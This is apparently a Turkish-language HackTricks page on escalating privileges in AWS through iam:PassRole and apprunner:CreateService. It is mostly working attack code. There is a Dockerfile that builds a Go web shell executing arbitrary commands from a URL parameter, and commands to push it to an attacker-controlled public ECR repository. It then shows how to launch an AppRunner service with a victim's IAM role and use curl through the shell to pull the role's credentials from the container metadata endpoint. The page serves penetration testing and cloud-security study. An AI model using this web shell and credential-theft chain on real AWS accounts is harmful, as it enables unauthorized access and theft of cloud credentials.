# AWS - AppRunner Privesc

{{#include ../../../banners/hacktricks-training.md}}

## AppRunner

### `iam:PassRole`, `apprunner:CreateService`

Bu izinlere sahip bir saldırgan, bir IAM rolü eklenmiş bir AppRunner hizmeti oluşturabilir ve böylece rolün kimlik bilgilerine erişerek yetkileri artırabilir.

Saldırgan önce, AppRunner konteynerinde rastgele komutlar çalıştırmak için bir web shell olarak hizmet eden bir Dockerfile oluşturur.
```Dockerfile
FROM golang:1.24-bookworm
WORKDIR /app
RUN apt-get update && apt-get install -y ca-certificates curl
RUN cat <<'EOF' > main.go
package main

import (
"fmt"
"net/http"
"os/exec"
)

func main() {
http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
command := exec.Command("sh", "-c", r.URL.Query().Get("cmd"))
output, err := command.CombinedOutput()
if err != nil {
fmt.Fprint(w, err.Error(), output)
return
}

fmt.Fprint(w, string(output))
})
http.ListenAndServe("0.0.0.0:3000", nil)
}
EOF
RUN go mod init test && go build -o main .
EXPOSE 3000
CMD ["./main"]
```
Sonra, bu görüntüyü bir ECR deposuna itin. 
Görüntüyü, saldırgan tarafından kontrol edilen bir AWS hesabındaki genel bir depoya iterek, mağdurun hesabının ECR'i manipüle etme izinleri olmasa bile ayrıcalık yükseltmesi mümkün hale gelir.
```sh
IMAGE_NAME=public.ecr.aws/<alias>/<namespace>/<repo-name>:latest
docker buildx build --platform linux/amd64 -t $IMAGE_NAME .
aws ecr-public get-login-password | docker login --username AWS --password-stdin public.ecr.aws
docker push $IMAGE_NAME
docker logout public.ecr.aws
```
Sonra, saldırgan bu web shell görüntüsü ve istismar etmek istedikleri IAM Rolü ile yapılandırılmış bir AppRunner hizmeti oluşturur.
```bash
aws apprunner create-service \
--service-name malicious-service \
--source-configuration '{
"ImageRepository": {
"ImageIdentifier": "public.ecr.aws/<alias>/<namespace>/<repo-name>:latest",
"ImageRepositoryType": "ECR_PUBLIC",
"ImageConfiguration": { "Port": "3000" }
}
}' \
--instance-configuration '{"InstanceRoleArn": "arn:aws:iam::123456789012:role/AppRunnerRole"}' \
--query Service.ServiceUrl
```
Servis oluşturulmasının tamamlanmasını bekledikten sonra, web shell'i kullanarak konteyner kimlik bilgilerini alın ve AppRunner'a ekli olan IAM Rolü'nün izinlerini elde edin.
```sh
curl 'https://<service-url>/?cmd=curl+http%3A%2F%2F169.254.170.2%24AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
```
**Potansiyel Etki:** AppRunner hizmetlerine eklenebilen herhangi bir IAM rolüne doğrudan ayrıcalık yükseltme. 

{{#include ../../../banners/hacktricks-training.md}}
